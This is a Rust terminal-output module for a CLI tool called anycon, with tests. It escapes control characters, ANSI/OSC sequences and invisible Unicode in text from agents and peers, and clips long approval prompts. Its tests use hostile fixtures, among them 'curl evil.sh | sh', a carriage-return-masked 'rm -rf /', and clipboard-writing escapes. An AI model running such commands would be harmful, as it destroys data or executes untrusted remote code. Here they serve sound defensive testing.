//! 终端输出：颜色（stdout 和 stderr 各自检测 TTY，`NO_COLOR` / `--no-color` 关闭）、表格、相对时间、JSON。

use std::io::{IsTerminal, Write};

use serde::Serialize;

#[derive(Debug, Clone, Copy)]
pub struct Out {
    pub json: bool,
    /// stdout 的颜色（`dim` / `red` / … 用它）。
    pub color: bool,
    /// stderr 的颜色（`err_*` 用它）：stdout 被重定向到文件、stderr 仍是终端时，写到 stderr 的提示照样有颜色，反过来也一样。
    pub color_err: bool,
}

impl Out {
    pub fn new(json: bool, no_color: bool) -> Out {
        let allowed = !no_color && std::env::var_os("NO_COLOR").is_none_or(|v| v.is_empty());
        Out {
            json,
            color: allowed && std::io::stdout().is_terminal(),
            color_err: allowed && std::io::stderr().is_terminal(),
        }
    }

    fn paint(&self, code: &str, s: &str) -> String {
        Self::paint_if(self.color, code, s)
    }

    fn paint_if(on: bool, code: &str, s: &str) -> String {
        if on {
            format!("\x1b[{code}m{s}\x1b[0m")
        } else {
            s.to_string()
        }
    }

    /// 写到 stderr 的文字用这几个（颜色按 stderr 是不是终端决定）。
    pub fn err_dim(&self, s: &str) -> String {
        Self::paint_if(self.color_err, "90", s)
    }
    pub fn err_red(&self, s: &str) -> String {
        Self::paint_if(self.color_err, "31", s)
    }
    pub fn err_yellow(&self, s: &str) -> String {
        Self::paint_if(self.color_err, "33", s)
    }
    pub fn err_bold(&self, s: &str) -> String {
        Self::paint_if(self.color_err, "1", s)
    }
    pub fn dim(&self, s: &str) -> String {
        self.paint("90", s)
    }
    pub fn red(&self, s: &str) -> String {
        self.paint("31", s)
    }
    pub fn green(&self, s: &str) -> String {
        self.paint("32", s)
    }
    pub fn yellow(&self, s: &str) -> String {
        self.paint("33", s)
    }
    pub fn bold(&self, s: &str) -> String {
        self.paint("1", s)
    }
    pub fn cyan(&self, s: &str) -> String {
        self.paint("36", s)
    }

    /// 单个 JSON 值（紧凑，一行）。
    pub fn json_line(&self, v: &impl Serialize) {
        let mut so = std::io::stdout().lock();
        let _ = writeln!(so, "{}", serde_json::to_string(v).unwrap_or_default());
        let _ = so.flush();
    }
}

/// 立即登记 SIGINT 处理（`signal()` 创建时就生效，不像 `ctrl_c()` 要等到第一次 poll）。
pub fn interrupt_signal() -> tokio::signal::unix::Signal {
    tokio::signal::unix::signal(tokio::signal::unix::SignalKind::interrupt())
        .expect("cannot register the SIGINT handler")
}

/// anycon 自己用的 SGR 前缀（`Out` 的颜色方法）：表格单元格里只认「整个单元格被其中一种包起来」。
const OWN_SGR: [&str; 6] = ["90", "31", "32", "33", "1", "36"];

/// 表格单元格的可见化：单元格里的目录名、项目名、路径、设备名、动作…都可能来自对端（或机器上恶意命名的目录），
/// 里面的 ESC / OSC / 回车不能原样写进终端。和 [`visible`] 一样显示成转义形式，换行也显示成 `\n`（表格每行一条记录）。
/// 例外：调用方用 `Out` 给**整个单元格**上的颜色（`ESC[<code>m … ESC[0m`，`code` 在 [`OWN_SGR`] 里）保留，里面的文字照样可见化。
pub fn table_cell(c: &str) -> String {
    if let Some(rest) = c.strip_prefix("\x1b[") {
        if let Some((code, inner)) = rest.split_once('m') {
            if OWN_SGR.contains(&code) {
                if let Some(inner) = inner.strip_suffix("\x1b[0m") {
                    return format!("\x1b[{code}m{}\x1b[0m", visible(inner).replace('\n', "\\n"));
                }
            }
        }
    }
    visible(c).replace('\n', "\\n")
}

/// 简单的对齐表格：第一行是表头。每个单元格先经过 [`table_cell`]。
pub fn table(rows: &[Vec<String>]) -> String {
    if rows.is_empty() {
        return String::new();
    }
    let rows: Vec<Vec<String>> = rows.iter().map(|r| r.iter().map(|c| table_cell(c)).collect()).collect();
    let cols = rows.iter().map(|r| r.len()).max().unwrap_or(0);
    let mut widths = vec![0usize; cols];
    for r in &rows {
        for (i, c) in r.iter().enumerate() {
            widths[i] = widths[i].max(display_width(c));
        }
    }
    let mut out = String::new();
    for r in &rows {
        let mut line = String::new();
        for (i, c) in r.iter().enumerate() {
            line.push_str(c);
            if i + 1 < r.len() {
                line.push_str(&" ".repeat(widths[i] - display_width(c) + 2));
            }
        }
        out.push_str(line.trim_end());
        out.push('\n');
    }
    out
}

/// 终端显示宽度的近似：CJK 等宽字符算 2 列，忽略 ANSI 转义。
pub fn display_width(s: &str) -> usize {
    let mut w = 0;
    let mut in_esc = false;
    for c in s.chars() {
        if in_esc {
            if c.is_ascii_alphabetic() {
                in_esc = false;
            }
            continue;
        }
        if c == '\x1b' {
            in_esc = true;
            continue;
        }
        let cp = c as u32;
        w += if (0x1100..=0x115F).contains(&cp)
            || (0x2E80..=0xA4CF).contains(&cp)
            || (0xAC00..=0xD7A3).contains(&cp)
            || (0xF900..=0xFAFF).contains(&cp)
            || (0xFE30..=0xFE6F).contains(&cp)
            || (0xFF00..=0xFF60).contains(&cp)
            || (0xFFE0..=0xFFE6).contains(&cp)
        {
            2
        } else {
            1
        };
    }
    w
}

/// `5m ago` / `2h ago` / `3d ago`；0 = `-`。
pub fn ago(ms: u64) -> String {
    if ms == 0 {
        return "-".into();
    }
    let now = anycon_daemon::util::now_ms();
    if ms > now {
        return "just now".into();
    }
    let s = (now - ms) / 1000;
    match s {
        0..=4 => "just now".into(),
        5..=59 => format!("{s}s ago"),
        60..=3599 => format!("{}m ago", s / 60),
        3600..=86399 => format!("{}h ago", s / 3600),
        _ => format!("{}d ago", s / 86400),
    }
}

pub fn short_id(id: &str) -> String {
    id.chars().take(12).collect()
}

/// 不可见的字符：Unicode `Cf`（格式字符）类的全部——零宽字符、双向文字控制符、软连字符、BOM、阿拉伯字母标记、
/// U+206A–206F、U+FFF9–FFFB、tag 字符 U+E0000–E007F……——再加上不属于 `Cf` 却同样看不见、能用来伪装或悄悄断行的：
/// 行 / 段分隔符 U+2028/2029、组合用字素连接符 U+034F、盲文空白 U+2800、Hangul 填充符（U+115F/1160/3164/FFA0）、
/// 蒙古文自由变体选择符 U+180B–180F、变体选择符（U+FE00–FE0F、U+E0100–E01EF）。
/// 它们不会被 `char::is_control` 抓到，却能让终端上显示的和实际的内容不一样（视觉欺骗）。
fn is_invisible_format(c: char) -> bool {
    use unicode_general_category::{get_general_category, GeneralCategory};
    get_general_category(c) == GeneralCategory::Format
        || matches!(
            c,
            '\u{2028}'
                | '\u{2029}'
                | '\u{034F}'
                | '\u{2800}'
                | '\u{115F}'
                | '\u{1160}'
                | '\u{3164}'
                | '\u{FFA0}'
                | '\u{180B}'..='\u{180F}'
                | '\u{FE00}'..='\u{FE0F}'
                | '\u{E0000}'..='\u{E007F}'
                | '\u{E0100}'..='\u{E01EF}'
        )
}

/// 来自对端的、要显示或存起来的名字：去掉控制字符和不可见的格式字符（双向文字控制符、零宽字符、U+2028/2029、BOM、
/// U+061C…，防终端转义序列 / 视觉欺骗），修剪空白，按**字符**截断到 `max` 个字符；清理后为空就用 `fallback`。
pub fn sanitize_label(s: &str, max: usize, fallback: &str) -> String {
    let cleaned: String = s.chars().filter(|c| !c.is_control() && !is_invisible_format(*c)).collect();
    let t: String = cleaned.trim().chars().take(max).collect();
    if t.is_empty() {
        fallback.to_string()
    } else {
        t
    }
}

/// 把来自 agent 的文本变成可以安全打印的样子（审批提示里的命令、路径、URL、标题、计划、问题、选项标签都经过它）：
/// 控制字符和 ANSI 转义不再被终端解释，而是显示成转义形式——`\x1b`、`\r`、`\t`、`\0`、其它显示成 `\x07` /
/// `\u{9b}`；不可见的格式字符（双向控制符、零宽字符、U+2028/2029…）显示成 `\u{202e}`。**换行保留**（多行命令照原样分行显示，
/// 调用方负责缩进）。普通文字、emoji、CJK 原样不动。
pub fn visible(s: &str) -> String {
    use std::fmt::Write;
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\n' => out.push('\n'),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\x1b' => out.push_str("\\x1b"),
            '\0' => out.push_str("\\0"),
            c if c.is_control() => {
                let n = c as u32;
                if n < 0x80 {
                    let _ = write!(out, "\\x{n:02x}");
                } else {
                    let _ = write!(out, "\\u{{{n:x}}}");
                }
            }
            c if is_invisible_format(c) => {
                let _ = write!(out, "\\u{{{:x}}}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

/// 流式输出（agent 的文字、思考、工具输出、别的客户端发的用户消息）用：让终端不会把里面的控制字符当成命令执行。
///
/// 和 [`visible`] 一样，**不吞掉**任何东西，而是显示成转义形式——`\x1b`、`\x07`、`\x08`、`\r`、`\u{9b}`……
/// （`ESC[8m` 隐藏文字、`ESC[2A` 光标上移改写已显示的内容、OSC 52 写剪贴板、C1 里单字节的 CSI、BEL、BS、单独的 CR 都会
/// 变成可见的字面文字）。不吞掉是故意的：吞掉整段转义序列要有跨 chunk 的解析状态，一个没结束的 OSC 还会把后面所有的输出
/// 都吃掉，agent 反而可以用它藏东西；显示成转义则每个 chunk 独立处理，用户总能看到 agent 试图做什么。
///
/// 保留：`\n`、`\t`，以及 `\r\n`（当作 `\n`——CR 后面紧跟 LF 改写不了任何东西）。anycon 自己的 SGR（`Out::dim` 等）是
/// **在这之后**加上去的，所以不受影响。双向文字的嵌入 / 覆盖 / 隔离控制符（U+202A–202E、U+2066–2069）也显示成转义
/// （它们能让一行文字显示的顺序和实际不一样）；零宽连接符之类在 emoji / 多语言文字里有正当用途，原样放行。
///
/// 管道（stdout 不是终端）也一样处理：`cat` / `less` / `tee` 的另一头往往还是终端，转义序列照样会被执行；
/// 要原始内容的程序应该用 `--json`（那里不经过这个函数）。
pub fn safe_text(s: &str) -> String {
    use std::fmt::Write;
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\n' | '\t' => out.push(c),
            '\r' if chars.peek() == Some(&'\n') => {}
            '\r' => out.push_str("\\r"),
            '\x1b' => out.push_str("\\x1b"),
            '\0' => out.push_str("\\0"),
            c if c.is_control() => {
                let n = c as u32;
                if n < 0x80 {
                    let _ = write!(out, "\\x{n:02x}");
                } else {
                    let _ = write!(out, "\\u{{{n:x}}}");
                }
            }
            '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' => {
                let _ = write!(out, "\\u{{{:x}}}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

/// 审批提示里一段文字默认完整展示；超过这么多字符才截断（并提示按 `v` 看全文）。
pub const CLIP_CHARS: usize = 2000;

/// 审批提示里一段文字（以及整条提示）最多显示这么多行；超过就截断并注明还有多少行、按 `v` 看全文。
/// 只按字符数截断不够：一条命令塞进上千个换行，就能把危险的部分挤出屏幕。
pub const CLIP_LINES: usize = 40;

/// 一段来自 agent 的文字，准备好显示了。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Clipped {
    /// 要打印的（已经 [`visible`]；被截断时末尾带 `…(+N lines, +M chars; …)`）。
    pub shown: String,
    /// 被截掉的字符数（0 = 没截断）。
    pub hidden: usize,
    /// 全文（已经 [`visible`]）。
    pub full: String,
}

impl Clipped {
    /// `shown` 占几行（被截断时包括那行注明）。
    pub fn shown_lines(&self) -> usize {
        self.shown.split('\n').count()
    }
}

/// 可见化 + 超过 `max` 个字符、或者超过 [`CLIP_LINES`] 行才截断。截断时注明还有多少行 / 多少字符；`hint` 为真时再注明
/// 「按 v 看全文」（交互提示里才有这个键）。
pub fn clip(s: &str, max: usize, hint: bool) -> Clipped {
    clip_to(s, max, CLIP_LINES, hint)
}

/// 同 [`clip`]，行数上限由调用方给（整条提示共用一个行数预算时，后面的字段能用的行数越来越少）。
pub fn clip_to(s: &str, max_chars: usize, max_lines: usize, hint: bool) -> Clipped {
    let max_lines = max_lines.max(1);
    let total_chars = s.chars().count();
    // 行数：末尾那个换行不算多出一行
    let total_lines = s.split_inclusive('\n').count();
    let full = visible(s);
    if total_chars <= max_chars && total_lines <= max_lines {
        return Clipped { shown: full.clone(), hidden: 0, full };
    }
    // 先按行截，再按字符截
    let line_cut = total_lines > max_lines;
    let kept: &str = if line_cut {
        let end: usize = s.split_inclusive('\n').take(max_lines).map(str::len).sum();
        // 去掉最后那一个换行（注明另起一行写），留着前面的空行：它们也是用户屏幕上的行
        s[..end].strip_suffix('\n').unwrap_or(&s[..end])
    } else {
        s
    };
    let kept_chars = kept.chars().count();
    let char_cut = kept_chars > max_chars;
    let head: String = if char_cut { kept.chars().take(max_chars).collect() } else { kept.to_string() };
    let shown_chars = head.chars().count();
    let hidden = total_chars - shown_chars;
    let head_lines = head.matches('\n').count() + 1;
    let hidden_lines = total_lines.saturating_sub(head_lines);
    let mut parts = Vec::new();
    if hidden_lines > 0 {
        parts.push(format!("+{hidden_lines} lines"));
    }
    if char_cut {
        // 没显示出来的字符总数（包括整行被截掉的那些行里的）
        parts.push(format!("+{hidden} chars"));
    }
    let tail = if hint { "; press v to view all" } else { "" };
    let note = format!("…({}{tail})", parts.join(", "));
    // 在一行中间截断的，注明紧跟在后面；按整行截断的，注明另起一行
    let sep = if char_cut { "" } else { "\n" };
    Clipped { shown: format!("{}{sep}{note}", visible(&head)), hidden, full }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn agent_text_is_made_visible_control_characters_never_reach_the_terminal() {
        // 回车改写、清行、响铃、DEL、C1（0x9b 是单字节的 CSI）、NUL、制表符
        assert_eq!(visible("echo safe\rrm -rf /"), "echo safe\\rrm -rf /");
        assert_eq!(visible("a\x1b[2Kb"), "a\\x1b[2Kb");
        assert_eq!(visible("\x1b]0;title\x07"), "\\x1b]0;title\\x07");
        assert_eq!(visible("x\x7fy\u{9b}31m\0z\tq"), "x\\x7fy\\u{9b}31m\\0z\\tq");
        // 双向控制符 / 零宽字符 / 行分隔符 / BOM 显示成转义，而不是悄悄改变显示
        assert_eq!(visible("a\u{202e}b\u{200b}c\u{2028}d\u{feff}"), "a\\u{202e}b\\u{200b}c\\u{2028}d\\u{feff}");
        // 换行保留，普通文字、CJK、emoji 原样
        assert_eq!(visible("line1\nline2 测试 😀"), "line1\nline2 测试 😀");
        assert!(!visible("\x1b[31m\r\x08\x07").chars().any(|c| c.is_control()));
    }

    #[test]
    fn every_invisible_format_character_is_recognised_not_just_a_hand_picked_few() {
        // 旧的手写清单漏了这些
        for c in [
            '\u{206A}',
            '\u{206F}', // 已弃用的格式字符
            '\u{FFF9}',
            '\u{FFFA}',
            '\u{FFFB}', // 注释锚点
            '\u{E0001}',
            '\u{E0020}',
            '\u{E007F}',
            '\u{E0000}', // tag 字符
            '\u{FE00}',
            '\u{FE0F}',
            '\u{E0100}',
            '\u{E01EF}',
            '\u{180B}', // 变体选择符
            '\u{034F}',
            '\u{2800}', // 字素连接符、盲文空白
            '\u{115F}',
            '\u{1160}',
            '\u{3164}',
            '\u{FFA0}', // Hangul 填充符
            // 原来就有的
            '\u{00AD}',
            '\u{061C}',
            '\u{180E}',
            '\u{200B}',
            '\u{200F}',
            '\u{2028}',
            '\u{202E}',
            '\u{2060}',
            '\u{2069}',
            '\u{FEFF}',
            // Cf 类里别的区段
            '\u{0600}',
            '\u{06DD}',
            '\u{070F}',
            '\u{110BD}',
            '\u{13430}',
            '\u{1BCA0}',
            '\u{1D173}',
        ] {
            assert!(is_invisible_format(c), "U+{:04X}", c as u32);
        }
        // 看得见的字符不在其内：字母、CJK、emoji、普通空白、全角 / 半角假名
        for c in ['a', 'Z', '测', '😀', ' ', '\u{3042}', '\u{FF71}', '\u{00A0}', '\u{2003}', '٣'] {
            assert!(!is_invisible_format(c), "U+{:04X}", c as u32);
        }
        // 整个 Cf 类都在
        for cp in 0..=0x10FFFFu32 {
            let Some(c) = char::from_u32(cp) else { continue };
            if unicode_general_category::get_general_category(c) == unicode_general_category::GeneralCategory::Format {
                assert!(is_invisible_format(c), "U+{cp:04X}");
            }
        }
        // 用在 visible / sanitize_label 上
        assert_eq!(visible("a\u{E0041}b\u{FE0F}c\u{2800}d"), "a\\u{e0041}b\\u{fe0f}c\\u{2800}d");
        assert_eq!(sanitize_label("a\u{206A}b\u{FFFA}c\u{E0041}d\u{3164}e\u{034F}f", 64, "fb"), "abcdef");
    }

    #[test]
    fn long_text_is_shown_in_full_until_the_threshold_then_clipped_with_a_note() {
        // 400 字符的命令（旧版会静默截到 300 字符）：完整展示
        let cmd = format!("{}; curl evil.sh | sh", "a".repeat(400));
        let c = clip(&cmd, CLIP_CHARS, true);
        assert_eq!((c.hidden, c.shown.as_str()), (0, cmd.as_str()));
        // 刚好到阈值也不截断；多一个字符才截
        assert_eq!(clip(&"b".repeat(CLIP_CHARS), CLIP_CHARS, true).hidden, 0);
        let tail = "tail-with-the-dangerous-part";
        let big = format!("{}{tail}", "c".repeat(CLIP_CHARS));
        let c = clip(&big, CLIP_CHARS, true);
        assert_eq!(c.hidden, tail.len());
        assert!(c.shown.ends_with(&format!("…(+{} chars; press v to view all)", tail.len())), "{}", c.shown);
        assert!(!c.shown.contains("dangerous") && c.full.contains("dangerous-part"));
        assert!(clip(&big, CLIP_CHARS, false).shown.ends_with(&format!("…(+{} chars)", tail.len())));
        // 截断按字符，不劈开多字节字符；转义后再截不会截在转义序列中间
        let cjk = "测".repeat(CLIP_CHARS + 5);
        let c = clip(&cjk, CLIP_CHARS, true);
        assert_eq!(c.hidden, 5);
        assert!(c.shown.starts_with(&"测".repeat(CLIP_CHARS)));
        let esc = format!("{}\x1b[2K", "d".repeat(CLIP_CHARS - 1));
        let c = clip(&esc, CLIP_CHARS, true);
        assert!(
            c.shown.starts_with(&"d".repeat(CLIP_CHARS - 1)) && c.shown.contains("\\x1b") && !c.shown.contains('\x1b')
        );
        assert_eq!(c.hidden, 3);
    }

    #[test]
    fn tables_align_including_wide_characters() {
        let t =
            table(&[vec!["NAME".into(), "N".into()], vec!["项目".into(), "1".into()], vec!["abc".into(), "22".into()]]);
        let lines: Vec<&str> = t.lines().collect();
        assert_eq!(lines[0], "NAME  N");
        assert_eq!(lines[1], "项目  1");
        assert_eq!(lines[2], "abc   22");
    }

    #[test]
    fn table_cells_never_carry_terminal_control_sequences() {
        // 目录名、项目名、路径可能带 ESC / OSC / 回车 / 换行（机器上已经有恶意命名的目录）
        let evil = "a\x1b[8mhidden\x1b[2A\x1b]52;c;ZXZpbA==\x07\rfake\nsecond-row\u{202e}x";
        let t = table(&[
            vec!["PROJECT".into(), "PATH".into()],
            vec![evil.into(), format!("/m/{evil}")],
            vec!["ok".into(), "/m/ok".into()],
        ]);
        assert!(!t.contains('\x1b') && !t.contains('\r') && !t.contains('\x07') && !t.contains('\u{202e}'), "{t:?}");
        assert_eq!(t.lines().count(), 3, "a newline inside a cell does not start a new row: {t:?}");
        assert!(t.contains("\\x1b[8mhidden") && t.contains("\\x1b]52;c;ZXZpbA==\\x07\\rfake\\nsecond-row"), "{t}");
        // anycon 自己给整个单元格上的颜色保留（里面的文字照样可见化）
        let o = Out { json: false, color: true, color_err: false };
        let t = table(&[
            vec!["ONLINE".into()],
            vec![o.green("yes")],
            vec![o.yellow("run\x1b[2Aning (1)")],
            vec![o.dim("-")],
        ]);
        assert!(t.contains("\x1b[32myes\x1b[0m") && t.contains("\x1b[33mrun\\x1b[2Aning (1)\x1b[0m"), "{t:?}");
        // 假装成自己的颜色但不是整个单元格：照样转义
        let t =
            table(&[vec!["X".into()], vec!["\x1b[31mred\x1b[0m tail".into()], vec!["\x1b[8mconceal\x1b[0m".into()]]);
        assert!(!t.contains('\x1b'), "{t:?}");
        // 对齐不受转义影响
        let t = table(&[vec!["N".into(), "V".into()], vec!["\x1b[0m".into(), "1".into()]]);
        assert_eq!(t.lines().nth(1).unwrap(), "\\x1b[0m  1");
    }

    #[test]
    fn relative_times() {
        let now = anycon_daemon::util::now_ms();
        assert_eq!(ago(0), "-");
        assert_eq!(ago(now), "just now");
        assert_eq!(ago(now - 120_000), "2m ago");
        assert_eq!(ago(now - 3 * 3_600_000), "3h ago");
        assert_eq!(ago(now - 2 * 86_400_000), "2d ago");
    }

    #[test]
    fn colors_are_off_when_requested() {
        let o = Out { json: false, color: false, color_err: false };
        assert_eq!(o.red("x"), "x");
        assert_eq!(o.err_red("x"), "x");
        let o = Out { json: false, color: true, color_err: false };
        assert_eq!(o.red("x"), "\x1b[31mx\x1b[0m");
        assert_eq!(o.err_red("x"), "x", "stderr colour follows stderr, not stdout");
        let o = Out { json: false, color: false, color_err: true };
        assert_eq!(o.err_yellow("x"), "\x1b[33mx\x1b[0m");
        assert_eq!(o.yellow("x"), "x");
    }

    #[test]
    fn labels_from_peers_are_cleaned_and_truncated_by_characters() {
        assert_eq!(sanitize_label("box\x1b[31m red\x07\n", 64, "fb"), "box[31m red");
        assert_eq!(sanitize_label("\u{202E}evil", 64, "fb"), "evil");
        assert_eq!(sanitize_label("  \x1b  ", 64, "fb"), "fb");
        // U+2028/2029、BOM、U+061C 也去掉
        assert_eq!(sanitize_label("a\u{2028}b\u{2029}c\u{feff}d\u{061c}e", 64, "fb"), "abcde");
        // 多字节字符不会在中间被劈开（按字符截断）
        let name = "测试".repeat(50);
        let t = sanitize_label(&name, 8, "fb");
        assert_eq!(t.chars().count(), 8);
        assert!(name.starts_with(&t));
    }
}
